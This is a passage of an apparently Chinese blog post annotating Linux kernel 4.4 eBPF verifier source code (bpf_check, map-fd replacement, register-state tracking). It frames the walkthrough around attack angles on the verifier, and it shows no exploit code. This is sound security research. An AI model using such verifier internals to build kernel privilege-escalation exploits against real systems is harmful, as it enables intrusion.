prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">[<span class="number">5</span>]	err = find_prog_type(type, prog);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* run eBPF verifier */</span></span><br><span class="line">[<span class="number">6</span>]	err = bpf_check(&amp;prog, attr);  <span class="comment">// here</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">	fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">	err = bpf_prog_select_runtime(prog);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	err = bpf_prog_new_fd(prog);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* failed to allocate fd */</span></span><br><span class="line">		<span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">free_used_maps:</span><br><span class="line">	free_used_maps(prog-&gt;aux);</span><br><span class="line">free_prog:</span><br><span class="line">	bpf_prog_uncharge_memlock(prog);</span><br><span class="line">free_prog_nouncharge:</span><br><span class="line">	bpf_prog_free(prog);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="bpf-check"><a href="#bpf-check" class="headerlink" title="bpf_check"></a>bpf_check</h3><p>下面进入加载的检查逻辑——<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L2214" target="_blank" rel="noopener">bpf_check</a>，首先在[1]处将特定指令中的mapfd换成相应的map实际地址，这里需要注意，map实际地址是一个内核地址，有8字节，这样就需要有两条指令的长度来存这个地址，具体可以看下面对这个函数的分析。[2]中借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，造成无法预期的风险。[3]是实际模拟执行的检测当上述有任一出现问题的检测，是检测的重点。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">		<span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 'struct verifier_env' can be global, but since it's not small,</span></span><br><span class="line"><span class="comment">	 * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!env)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">	mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">		<span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment">		 * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		log_level = attr-&gt;log_level;</span><br><span class="line">		log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">		log_size = attr-&gt;log_size;</span><br><span class="line">		log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">		<span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">		<span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span class="line">		    log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">		log_buf = vmalloc(log_size);</span><br><span class="line">		<span class="keyword">if</span> (!log_buf)</span><br><span class="line">			<span class="keyword">goto</span> free_env;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		log_level = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]	ret = replace_map_fd_with_map_ptr(env); <span class="comment">// 采用map结构将BPF_LD_IMM64中的imm参数替换。</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">	env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">				       <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">				       GFP_USER);</span><br><span class="line">	ret = -ENOMEM;</span><br><span class="line">	<span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">		<span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]	ret = check_cfg(env);<span class="comment">//控制流图检查是否存在死循环和盲跳转</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]	ret = do_check(env);</span><br><span class="line"></span><br><span class="line">skip_full_check:</span><br><span class="line">	<span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">	free_states(env);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">		ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">		BUG_ON(log_len &gt;= log_size);</span><br><span class="line">		<span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">		ret = -ENOSPC;</span><br><span class="line">		<span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">	<span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> free_log_buf;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">		<span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">		env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">							  <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">							  GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">			ret = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> free_log_buf;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">		       <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">		env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment">		 * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		convert_pseudo_ld_imm64(env);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">free_log_buf:</span><br><span class="line">	<span class="keyword">if</span> (log_level)</span><br><span class="line">		vfree(log_buf);</span><br><span class="line">free_env:</span><br><span class="line">	<span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">		<span class="comment">/* if we didn't copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment">		 * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		release_maps(env);</span><br><span class="line">	*prog = env-&gt;prog;</span><br><span class="line">	kfree(env);</span><br><span class="line">	mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="replace-map-fd-with-map-ptr"><a href="#replace-map-fd-with-map-ptr" class="headerlink" title="replace_map_fd_with_map_ptr"></a>replace_map_fd_with_map_ptr</h3><p><a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1990" target="_blank" rel="noopener">replace_map_fd_with_map_ptr</a>函数中，可以看到当满足[1]、[2]两个条件时，即opcode = BPF_LD | BPF_IMM | BPF_DW=0x18，且src_reg = BPF_PSEUDO_MAP_FD =1时，将根据imm的值进行map查找，并将得到的地址分成两部分，分别存储于该条指令和下一条指令的imm部分，与上文所说的占用两条指令是相符的。满足上述两个条件的语句又被命名为BPF_LD_MAP_FD，即把map地址放到寄存器里，该指令写完后，下一条指令应为无意义的填充。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">replace_map_fd_with_map_ptr</span><span class="params">(struct verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span> = <span class="title">env</span>-&gt;<span class="title">prog</span>-&gt;<span class="title">insnsi</span>;</span></span><br><span class="line">	<span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_LDX &amp;&amp;</span><br><span class="line">		    (BPF_MODE(insn-&gt;code) != BPF_MEM || insn-&gt;imm != <span class="number">0</span>)) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_LDX uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;<span class="comment">// 不允许向寄存器直接写值 LDX</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_STX &amp;&amp;</span><br><span class="line">		    ((BPF_MODE(insn-&gt;code) != BPF_MEM &amp;&amp;</span><br><span class="line">		      BPF_MODE(insn-&gt;code) != BPF_XADD) || insn-&gt;imm != <span class="number">0</span>)) &#123;</span><br><span class="line">			verbose(<span class="string">"BPF_STX uses reserved fields\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;<span class="comment">//不允许向地址写寄存器 STX</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]		<span class="keyword">if</span> (insn[<span class="number">0</span>].code == (BPF_LD | BPF_IMM | BPF_DW)) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (i == insn_cnt - <span class="number">1</span> || insn[<span class="number">1</span>].code != <span class="number">0</span> ||</span><br><span class="line">			    insn[<span class="number">1</span>].dst_reg != <span class="number">0</span> || insn[<span class="number">1</span>].src_reg != <span class="number">0</span> ||</span><br><span class="line">			    insn[<span class="number">1</span>].off != <span class="number">0</span>) &#123;</span><br><span class="line">				verbose(<span class="string">"invalid bpf_ld_imm64 insn\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;<span class="comment">//最后一条指令，下一条指令确定为0</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;src_reg == <span class="number">0</span>)</span><br><span class="line">				<span class="comment">/* valid generic load 64-bit imm */</span></span><br><span class="line">				<span class="keyword">goto</span> next_insn;</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]			<span class="keyword">if</span> (insn-&gt;src_reg != BPF_PSEUDO_MAP_FD) &#123;</span><br><span class="line">				verbose(<span class="string">"unrecognized bpf_ld_imm64 insn\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			f = fdget(insn-&gt;imm);</span><br><span class="line">			<span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">			<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>)) &#123;</span><br><span class="line">				verbose(<span class="string">"fd %d is not pointing to valid bpf_map\n"</span>,</span><br><span class="line">					insn-&gt;imm);</span><br><span class="line">				<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* store map pointer inside BPF_LD_IMM64 instruction */</span></span><br><span class="line">			insn[<span class="number">0</span>].imm = (u32) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">map</span>;</span><br><span class="line">			insn[<span class="number">1</span>].imm = ((u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">map</span>) &gt;&gt; <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check whether we recorded this map already */</span></span><br><span class="line">			<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; env-&gt;used_map_cnt; j++)</span><br><span class="line">				<span class="keyword">if</span> (env-&gt;used_maps[j] == <span class="built_in">map</span>) &#123;</span><br><span class="line">					fdput(f);</span><br><span class="line">					<span class="keyword">goto</span> next_insn;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (env-&gt;used_map_cnt &gt;= MAX_USED_MAPS) &#123;</span><br><span class="line">				fdput(f);</span><br><span class="line">				<span class="keyword">return</span> -E2BIG;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* hold the map. If the program is rejected by verifier,</span></span><br><span class="line"><span class="comment">			 * the map will be released by release_maps() or it</span></span><br><span class="line"><span class="comment">			 * will be used by the valid program until it's unloaded</span></span><br><span class="line"><span class="comment">			 * and all maps are released in free_bpf_prog_info()</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="built_in">map</span> = bpf_map_inc(<span class="built_in">map</span>, <span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>)) &#123;</span><br><span class="line">				fdput(f);</span><br><span class="line">				<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			env-&gt;used_maps[env-&gt;used_map_cnt++] = <span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line">			fdput(f);</span><br><span class="line">next_insn:</span><br><span class="line">			insn++;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* now all pseudo BPF_LD_IMM64 instructions load valid</span></span><br><span class="line"><span class="comment">	 * 'struct bpf_map *' into a register instead of user map_fd.</span></span><br><span class="line"><span class="comment">	 * These pointers will be used later by verifier to validate map access.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="do-check"><a href="#do-check" class="headerlink" title="do_check"></a>do_check</h3><p>下面进行check过程中最核心的<a href="https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L1723" target="_blank" rel="noopener">do_check</a>函数，首先可以看到整个程序处于一个for死循环中，其中维护了一系列寄存器，其寄存器变量定义和初始化如下，可以看到寄存器的值是一个int类型，并且有一个枚举的type变量，type类型包括未定义、位置、立即数、指针等，初始化时会将全部寄存器类型定义为未定义，赋值为0。第十个寄存器定义为栈指针，第一个定义为内容指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">enum</span> bpf_reg_type type;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">		<span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_reg_state</span><span class="params">(struct reg_state *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_BPF_REG; i++) &#123;</span><br><span class="line">		regs[i].type = NOT_INIT;</span><br><span class="line">		regs[i].imm = <span class="number">0</span>;</span><br><span class="line">		regs[i].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* frame pointer */</span></span><br><span class="line">	regs[BPF_REG_FP].type = FRAME_PTR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 1st arg to a function */</span></span><br><span class="line">	regs[BPF_REG_1].type = PTR_TO_CTX;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* types of values stored in eBPF registers */</span></span><br><span class="line"><span class="keyword">enum</span> bpf_reg_type &#123;</span><br><span class="line">	NOT_INIT = <span class="number">0</span>,		 <span class="comment">/* nothing was written into register */</span></span><br><span class="line">	UNKNOWN_VALUE,		 <span class="comment">/* reg doesn't contain a valid pointer */</span></span><br><span class="line">	PTR_TO_CTX,		 <span class="comment">/* reg points to bpf_context */</span></span><br><span class="line">	CONST_PTR_TO_MAP,	 <span class="comment">/* reg points to struct bpf_map */</span></span><br><span class="line">	PTR_TO_MAP_VALUE,	 <span class="comment">/* reg points to map element value */</span></span><br><span class="line">	PTR_TO_MAP_VALUE_OR_NULL,<span class="comment">/* points to map elem value or NULL */</span></span><br><span class="line">	FRAME_PTR,		 <span class="comment">/* reg == frame_pointer */</span></span><br><span class="line">	PTR_TO_STACK,		 <span class="comment">/* reg == frame_pointer + imm */</span></span><br><span class="line">	CONST_IMM,		 <span class="comment">/* constant integer value */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>check函数的处理方式是逐条处理，按照不同的类型分别做check。由于指令比较多，不一样赘述了，下面从两个攻击角度去展示程序是如何检测的。</p>
<h4 id="Q-amp-A1：for循环如何会检查结束并退出"><a href="#Q-amp-A1：for循环如何会检查结束并退出" class="headerlink" title="Q&amp;A1：for循环如何会检查结束并退出"></a>Q&amp;A1：for循环如何会检查结束并退出</h4><p>退出指令定义为BPF_EXIT，这个指令属于BPF_JMP大类，可以看到当指令为该条指令的时候会执行一个pop_stack操作，而当这个函数的返回值是负数的时候，用break跳出死循环。否则会用这个作为取值的位置去执行下一条指令。对于这个操作的理解是，当遇到条件跳转的时候，程序会默认执行一个分支，然后将另外一个分支压入stack中，当一个分支执行结束后，去检查另外一个分支，类似于迷宫问题解决里走到思路的退栈操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123;</span><br><span class="line">			u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">				<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">				    insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">				    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">				    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">					verbose(<span class="string">"BPF_CALL uses reserved fields\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EINVAL;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				err = check_call(env, insn-&gt;imm);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">				